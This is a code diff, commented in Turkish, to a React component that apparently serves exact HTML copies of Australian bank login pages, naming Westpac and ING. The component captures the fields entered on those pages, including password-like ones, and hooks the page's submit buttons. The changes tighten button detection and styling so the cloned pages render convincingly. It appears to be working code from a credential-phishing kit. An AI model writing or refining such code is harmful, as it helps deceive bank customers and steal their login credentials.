@@ -370,6 +370,95 @@ function hasPasswordLikeField(fields: CapturedField[]) {
   );
 }
 
+// ⭐ ACTION NODE FİLTRESİ (SADECE GERÇEKTEN BUTON OLANLAR KALSIN):
+//   Westpac'ta [class*='login'] GENİŞ selector'ü ile 20+ DIV/INPUT/SECTION
+//   (sınıfında 'login' geçen: login-form-div, login-customer-input vb.) actionNodes
+//   listesine GİRİYOR ve fadeOpacity=0.3 atanınca TÜM SAYFA SİLİKLEŞİYORDU.
+//   Bu filtre SADECE: BUTON, INPUT[type=submit/button], A.btn, [role=button],
+//   [onclick] olan elementleri KABUL EDER. DİĞER TÜM (div, input[type=text], label,
+//   form, section, header, span) ATAKILIR.
+function isElementActuallyButtonLike(node: HTMLElement): boolean {
+  try {
+    const tag = (node.tagName || "").toLowerCase();
+    const typeAttr = (node.getAttribute("type") || "").toLowerCase();
+
+    if (tag === "button") return true;
+    if (tag === "input" && ["submit", "button"].includes(typeAttr)) return true;
+    if (tag === "a") {
+      const cls = (node.getAttribute("class") || "").toLowerCase();
+      if (/\bbtn\b/.test(cls)) return true;
+    }
+    if (node.getAttribute("role") === "button") return true;
+    if (node.hasAttribute("onclick")) return true;
+
+    // Class/ID bazlı kontrollü SIKI filtre (GENİŞ *contain KALDIRILDI):
+    //   SADECE '.btn', '.btn-primary', '.btn-submit', '.button-primary' gibi
+    //   AÇIKÇA buton sınıfı olanlar kabul edilir. 'login-form' gibi içerikte
+    //   geçenler SAYILMAZ.
+    const cls = (node.getAttribute("class") || "").trim().toLowerCase();
+    const idAttr = (node.getAttribute("id") || "").trim().toLowerCase();
+    if (cls) {
+      const classTokens = cls.split(/\s+/);
+      for (const t of classTokens) {
+        if (
+          t === "btn" ||
+          t === "button" ||
+          t === "btn-primary" ||
+          t === "btn-submit" ||
+          t === "btn-default" ||
+          t === "btn-success" ||
+          t === "btn-login" ||
+          t === "btn-continue" ||
+          t === "btn-next" ||
+          t === "primary" ||
+          t === "submit-btn" ||
+          t === "login-btn" ||
+          t === "el-button" ||
+          t === "van-button" ||
+          t === "sg-btn" ||
+          t === "sg-btn--primary" ||
+          t.startsWith("btn-") ||
+          t.startsWith("button-")
+        ) {
+          return true;
+        }
+      }
+    }
+    if (idAttr) {
+      if (
+        idAttr === "login-button" ||
+        idAttr === "submit-button" ||
+        idAttr === "continue-button" ||
+        idAttr === "next-button" ||
+        idAttr === "btn-login" ||
+        idAttr === "btn-submit" ||
+        idAttr === "login" ||
+        idAttr === "submit" ||
+        idAttr.endsWith("-submit") ||
+        idAttr.endsWith("-login") ||
+        idAttr.endsWith("-btn") ||
+        idAttr.endsWith("-button")
+      ) {
+        return true;
+      }
+    }
+
+    const dataTestId = (node.getAttribute("data-testid") || "").toLowerCase();
+    if (
+      dataTestId === "login-button" ||
+      dataTestId === "submit-button" ||
+      dataTestId.includes("login-button") ||
+      dataTestId.includes("submit-button")
+    ) {
+      return true;
+    }
+
+    return false;
+  } catch {
+    return false;
+  }
+}
+
 function isExternalHref(href: string | null) {
   if (!href) return false;
   return /^https?:\/\//i.test(href.trim());
@@ -802,15 +891,21 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const arr: HTMLElement[] = [];
       try {
         const fNodes = form ? Array.from(form.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, [data-testid='login-button'], a.btn, .btn-primary, .btn, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='login'], [id*='continue'], [id*='next']",
+          "button, input[type='submit'], input[type='button'], [role='button'], .el-button, .van-button, .btn-submit, a.btn, .btn-primary, .btn, [onclick], [data-testid='login-button'], [data-testid='submit-button']",
         )) : [];
         const dNodes = Array.from(d.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], [onclick], [class*='btn-'], [class*='button-'], [class*='btn_'], [id*='btn-'], [id*='button']",
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login-button'], [data-testid*='submit-button'], [onclick]",
         ));
         const seen = new Set<HTMLElement>();
         [...fNodes, ...dNodes].forEach((n) => {
           if (seen.has(n)) return;
           seen.add(n);
+
+          // ⭐ 1. KATMAN SIKI FİLTRE: SADECE GERÇEKTEN BUTON OLANLAR KALSIN.
+          //   Westpac 20+ div/section/classı='login-form-section' öğelerin hiçbiri
+          //   burada geçemez (tag BUTON değil, type submit değil).
+          if (!isElementActuallyButtonLike(n)) return;
+
           const tok = getElementActionToken(n);
           const isi =
             n instanceof HTMLInputElement && ["submit", "button"].includes((n.getAttribute("type") ?? "").toLowerCase());
@@ -822,22 +917,31 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           arr.push(n);
         });
 
-        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, form veya doc içinde
-        // class/id/textte btn/button/login/submit/next/continue/ileri/giriş/giris/sonraki/tamam/onay/devam
-        // geçen HER elementi al ve submit butonu olarak ele al.
+        // BRUTE FORCE FALLBACK: Eğer yukarıdan 0 node geldiyse, 2. katman filtre
+        // isElementActuallyButtonLike İLE. Westpac login-form-div vb. öğeler burada da GEÇEMEZ.
         if (arr.length === 0) {
           const fallBackSource =
             form ? form : d.body ?? d.documentElement;
           if (fallBackSource) {
             const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
-            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar/i;
+            const bfRe = /btn|button|login|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|logon|log\s*on|sigon|auth|validate|accept|unlock|proceed|sign\s*on|signon/i;
             allIn.forEach((el) => {
               if (seen.has(el)) return;
               const tag = (el.tagName || "").toLowerCase();
               const type = (el.getAttribute("type") || "").toLowerCase();
-              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
+              const tOk =
+                tag === "button" ||
+                (tag === "input" && ["submit", "button"].includes(type)) ||
+                el.getAttribute("role") === "button" ||
+                (tag === "a" && /\bbtn\b/.test((el.getAttribute("class") || "").toLowerCase())) ||
+                el.hasAttribute("onclick");
+              if (!tOk) return;
+
+              // ⭐ 2. KATMAN SIKI FİLTRE (fallback bile olsa SADECE butonlar)
+              if (!isElementActuallyButtonLike(el)) return;
+
               const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
-              if (tOk || bfRe.test(idClsTxt)) {
+              if (bfRe.test(idClsTxt)) {
                 seen.add(el);
                 arr.push(el);
               }
@@ -911,6 +1015,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const pointerEvents = saving ? "none" : "auto";
 
       actionNodes.forEach((node) => {
+        // ⭐ SON GÜVENCE: SADECE GERÇEKTEN BUTON OLANLARA STILLER UYGULA.
+        //   Eğer computeActionNodes Filtresinden HERHANGİ şekilde yanlışlıkla
+        //   div/section/input[type=text] girmişse BURADA ATAK. (Westpac SOLUK
+        //   sayfa sorunu ANA tedavi bu 2. filtre!)
+        if (!isElementActuallyButtonLike(node)) return;
         try {
           if ("disabled" in node) {
             try { (node as any).disabled = false; } catch {}
@@ -969,6 +1078,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     };
 
     actionNodes.forEach((node) => {
+      // ⭐ FİLTRE: SADECE GERÇEKTEN BUTON OLANLARA event listener bağla.
+      //   Westpac 20+ yanlış input/divlere click listener bağlanırsa form içindeki
+      //   herhangi bir input tıklamasında SUBMIT tetiklenebilir (istenmeyen).
+      if (!isElementActuallyButtonLike(node)) return;
       try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
@@ -1252,7 +1365,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         } catch {}
 
         const allCandidates = doc.querySelectorAll<HTMLElement>(
-          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='continue'], [id*='next'], [class*='logon'], [class*='signin'], [id*='logon'], [id*='signin']",
+          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, .el-button, .van-button, .btn-submit, [data-testid*='login-button'], [data-testid*='submit-button'], [onclick]",
         );
 
         const candidateNodes: HTMLElement[] = [];
@@ -1260,6 +1373,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         allCandidates.forEach((node) => {
           if (seenCandidates.has(node)) return;
           seenCandidates.add(node);
+
+          // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
+          if (!isElementActuallyButtonLike(node)) return;
+
           const nodeToken = getElementActionToken(node);
           const isSubmitInput =
             node instanceof HTMLInputElement &&
@@ -1284,6 +1401,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           try {
             node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
           } catch {}
+
+          // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
+          if (!isElementActuallyButtonLike(node)) return;
 
           // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
           try {
@@ -1365,14 +1485,27 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           } catch {}
         });
 
-        // ⭐ ING Australia ÖZEL: tag name "ing-" başlayan ve buton gibi davranan custom elementleri
+        // ⭐ ING / UI5 ÖZEL: tag name "ing-" "ui5-" "sl-" başlayan ve buton gibi davranan custom elementler
         //   (örn: ing-login-submit) ayrıca brute-force olarak bul & listeye ekle + STIL/HANDLER UYGULA
         try {
           const ingCandidates = doc.querySelectorAll<HTMLElement>("*");
           ingCandidates.forEach((el) => {
             if (seenCandidates.has(el)) return;
             const tag = (el.tagName || "").toLowerCase();
-            if (!tag.startsWith("ing-") && !tag.startsWith("ui5-") && !tag.startsWith("sl-")) return;
+            if (!tag.startsWith("ing-") && !tag.startsWith("ui5-") && !tag.startsWith("sl-") && !tag.startsWith("sg-")) return;
+
+            // ⭐ WEB COMPONENT BUTON FİLTRESİ: ing-input, sg-input (INPUT) custom elementleri
+            //   buton DEĞİLDİR, onlara fadeOpacity UYGULAMA! SADECE ing-button, ing-login-submit
+            //   gibi GERÇEKTEN buton/action görevi görenleri kabul et.
+            if (!isElementActuallyButtonLike(el)) {
+              const tok = getElementActionToken(el);
+              const role = (el.getAttribute("role") || "").toLowerCase();
+              const isActionBut =
+                role === "button" ||
+                /submit|login|button|next|continue|confirm|accept|proceed|validate|unlock|signon|sigon|auth/.test(tok);
+              if (!isActionBut) return;
+            }
+
             const tok = getElementActionToken(el);
             const role = (el.getAttribute("role") || "").toLowerCase();
             if (ACTION_BUTTON_RE.test(tok) || role === "button" || /submit|login|button|next|continue/.test(tok)) {
@@ -1406,18 +1539,22 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 } catch {}
                 try {
                   if (shouldForceEnable) {
-                    el.style.background = activeColor;
-                    el.style.color = "#FFFFFF";
-                    el.style.border = `1px solid ${activeColor}`;
-                    el.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
+                    el.style.setProperty("background", activeColor, "important");
+                    el.style.setProperty("color", "#7A4E00", "important");
+                    el.style.setProperty("border", "1px solid #E5B800", "important");
+                    el.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
                   } else {
-                    el.style.background = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
-                    el.style.color = "#8A8E90";
-                    el.style.border = "1px solid transparent";
-                    el.style.boxShadow = "none";
+                    const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
+                    el.style.setProperty("background", bgCol, "important");
+                    el.style.setProperty("color", "#8A8E90", "important");
+                    el.style.setProperty("border", "1px solid transparent", "important");
+                    el.style.setProperty("box-shadow", "none", "important");
                   }
-                  el.style.transition =
-                    "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease";
+                  el.style.setProperty(
+                    "transition",
+                    "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
+                    "important",
+                  );
                 } catch {}
                 try {
                   const curRef = submitWithCurrentValuesRef.current;
@@ -1444,7 +1581,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         } catch {}
 
         // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
-        // form + doc içinde class/id/textte btn/button/login/submit/next/continue vs geçen her elementi al
+        // form + doc içinde GERÇEKTEN buton olan ve class/id/textte geçenleri al.
         if (candidateNodes.length === 0) {
           try {
             const fallBackSource = form ?? doc.body ?? doc.documentElement;
@@ -1455,7 +1592,17 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               if (seenCandidates.has(el)) return;
               const tag = (el.tagName || "").toLowerCase();
               const type = (el.getAttribute("type") || "").toLowerCase();
-              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
+              const cls = (el.getAttribute("class") || "").toLowerCase();
+              const tOk =
+                tag === "button" ||
+                (tag === "input" && (type === "submit" || type === "button")) ||
+                el.getAttribute("role") === "button" ||
+                (tag === "a" && /\bbtn\b/.test(cls)) ||
+                el.hasAttribute("onclick");
+
+              // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
+              if (!isElementActuallyButtonLike(el)) return;
+
               const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
               if (tOk || bfRe.test(idClsTxt)) {
                 seenCandidates.add(el);
@@ -1464,6 +1611,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             });
             // Fallback node'ları için de candidate loop'taki tüm stillendirme + handler bağlama
             extra.forEach((node) => {
+              // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
+              if (!isElementActuallyButtonLike(node)) return;
+
               candidateNodes.push(node);
               if ("disabled" in node) {
                 try { (node as any).disabled = !shouldForceEnable; } catch {}
